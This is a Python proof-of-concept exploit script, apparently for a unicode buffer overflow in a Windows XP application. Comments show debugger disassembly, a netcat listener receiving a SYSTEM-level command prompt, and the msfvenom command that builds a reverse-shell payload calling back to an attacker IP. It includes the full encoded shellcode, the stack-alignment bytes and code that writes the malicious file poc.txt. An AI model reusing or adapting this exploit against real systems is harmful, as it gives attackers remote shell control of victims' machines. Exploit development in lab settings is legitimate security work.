#004D002F  |. 5E             POP ESI
#004D0030  |> 5F             POP EDI
#004D0031  \. C3             RETN

#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.194] from (UNKNOWN) [192.168.11.177] 1213
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Documents and Settings\Administrator\Desktop>


#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.194 lport=5555 -e x86/unicode_upper BufferRegister=EAX
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/unicode_upper
#x86/unicode_upper succeeded with size 779 (iteration=0)
#x86/unicode_upper chosen with final size 779
#Payload size: 779 bytes
payload="PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLZHU2KPM0KPS0U9K501GP2DDK20NPTK1BLLDK1BMDTK2RNHLOGGOZNF01KOVLOLC13LLBNLO0WQHOLMM197IRZR0RB7TKPRN0TK0JOLTK0LLQD8ZCQ8M18Q21TK1IO0KQIC4KOYMHYSNZOY4KODTKM1IF01KO6LWQHOLMKQI7NX9PCEZVM3CMJXOKCMO4D59TQHTK28NDM1YCQVTKLLPK4KQHMLM1XSTKLDDKM1Z0DI0DMTMT1K1KC1QI1JR1KOIP1OQOPZDKN2JKTM1MQXP3OBM0KPRHCGD3NRQO0TRHPLT7NFM7KOYEH8DPM1KPM0NIXDQDB0BHO9E02KM0KO9EPPB020PPQ0R0OPB02HYZLOYOYPKOJ5UG2JKURHGPUXLKXBC8KRKPN57CTIZFQZN0R60WS8TY5URT31KOXUDEY0T4LLKO0NM8CEZLS8ZPH5W2PVKOYEBHS32MBDM059YS271G1G01ZVBJLRR9269RKMC6GWQ4NDOLM1KQ4MQ4NDN096M00DR40PB60V260FB60NR61FB31FC8D9HLOOSVKO8U3YIP0NQFQ6KOP0BHLHSWMMC0KOIEGKJPX5VB0VRHG6657MEMKOHUOLKV3LLJCPKKIP45KU7K0GMCRRBOBJKPQCKOYEAA"

alignment="\x54\x4d\x58\x4d"+"\x61\x4d" *2 + "\x58" + "\x61"+ "\x2D\x77\x77\x61"*29 + "\x2D\x52\x40\x61" + "\x2d\x3c\x45\x61"+ "\x50\x61"
value="\x60\x21"*270 +"\x61\x4d" + "\x2f\x4d" + alignment + "\x50\x4d"*14 + payload +  "D"*(10031-542-12-107-len(payload))


f=open("poc.txt","w")
f.write(value)
f.close
